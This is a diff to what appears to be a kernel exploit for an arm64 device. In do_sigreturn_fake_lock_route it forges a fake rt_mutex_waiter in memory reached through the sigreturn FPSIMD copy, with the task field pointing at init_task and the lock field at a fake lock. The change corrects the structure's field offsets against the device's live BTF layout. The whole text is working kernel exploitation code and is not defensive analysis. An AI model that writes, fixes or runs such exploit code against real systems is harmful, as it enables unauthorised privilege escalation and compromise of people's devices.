@@ -39,24 +39,51 @@ void do_sigreturn_fake_lock_route(void) {
     int calls = 0;
     int success = 0;
 
-    /* Build fake rt_mutex_waiter (0x58 bytes) at FPSIMD copy offset 0x18 */
+    /* Build fake rt_mutex_waiter (0x58 bytes) at FPSIMD copy offset 0x18.
+     *
+     * Field offsets below were WRONG before this fix (shifted by one
+     * 8-byte slot from offset 0x18 onward, and "prio" was written as an
+     * 8-byte value at what is actually the "lock" pointer's slot).
+     * Corrected against pahole/BTF read live off this exact device this
+     * session:
+     *   struct rt_mutex_waiter {
+     *     struct rb_node tree_entry;     // 0x00, 24 bytes
+     *     struct rb_node pi_tree_entry;  // 0x18, 24 bytes
+     *     struct task_struct *task;      // 0x30
+     *     struct rt_mutex_base *lock;    // 0x38
+     *     unsigned int wake_state;       // 0x40
+     *     int prio;                      // 0x44
+     *     u64 deadline;                  // 0x48
+     *     struct ww_acquire_ctx *ww_ctx; // 0x50
+     *   };  // size 0x58, matches FAKE_WAITER_LAYOUT_SIZE
+     * Also matches this project's own FAKE_WAITER_* offsets in target.h
+     * (FAKE_WAITER_PI_TREE_ENTRY_OFF=0x18, FAKE_WAITER_TASK_OFF=0x30,
+     * FAKE_WAITER_LOCK_OFF=0x38, FAKE_WAITER_PRIO_OFF=0x44), which
+     * put_fake_waiter() in util.c already uses correctly -- this function
+     * had drifted from that and was never caught because it had never
+     * been reached in any test run before this session (always failed
+     * earlier on missing page_base/fake_lock/fake_fops). Field VALUES
+     * unchanged from the original intent, only their byte positions are
+     * corrected. */
     memset(g_fake_waiter, 0, sizeof(g_fake_waiter));
     uint64_t val;
 
-    val = fake_w0;
-    memcpy(g_fake_waiter + 0x00, &val, sizeof(val));   /* list.next / rb_parent_color */
     val = 0;
-    memcpy(g_fake_waiter + 0x08, &val, sizeof(val));   /* list.prev */
-    memcpy(g_fake_waiter + 0x10, &val, sizeof(val));   /* rb_parent_color = black, no parent */
-    memcpy(g_fake_waiter + 0x18, &val, sizeof(val));   /* rb_right = NULL */
-    memcpy(g_fake_waiter + 0x20, &val, sizeof(val));   /* rb_left = NULL */
+    memcpy(g_fake_waiter + 0x00, &val, sizeof(val));   /* tree_entry.parent_color */
+    memcpy(g_fake_waiter + 0x08, &val, sizeof(val));   /* tree_entry.rb_right */
+    memcpy(g_fake_waiter + 0x10, &val, sizeof(val));   /* tree_entry.rb_left */
+    val = fake_w0;
+    memcpy(g_fake_waiter + 0x18, &val, sizeof(val));   /* pi_tree_entry.parent_color */
+    val = 0;
+    memcpy(g_fake_waiter + 0x20, &val, sizeof(val));   /* pi_tree_entry.rb_right */
+    memcpy(g_fake_waiter + 0x28, &val, sizeof(val));   /* pi_tree_entry.rb_left */
     val = text_addr(INIT_TASK);
-    memcpy(g_fake_waiter + 0x28, &val, sizeof(val));   /* task */
+    memcpy(g_fake_waiter + 0x30, &val, sizeof(val));   /* task */
     val = fake_lock;
-    memcpy(g_fake_waiter + 0x30, &val, sizeof(val));   /* lock */
-    val = 3;
-    memcpy(g_fake_waiter + 0x38, &val, sizeof(val));   /* prio */
-    /* 0x40-0x57: ww_ctx + padding = zero */
+    memcpy(g_fake_waiter + 0x38, &val, sizeof(val));   /* lock */
+    uint32_t prio = 3;
+    memcpy(g_fake_waiter + 0x44, &prio, sizeof(prio)); /* prio */
+    /* 0x40 wake_state, 0x48 deadline, 0x50 ww_ctx: zero, matches original intent */
 
     struct sigaction sa;
     memset(&sa, 0, sizeof(sa));
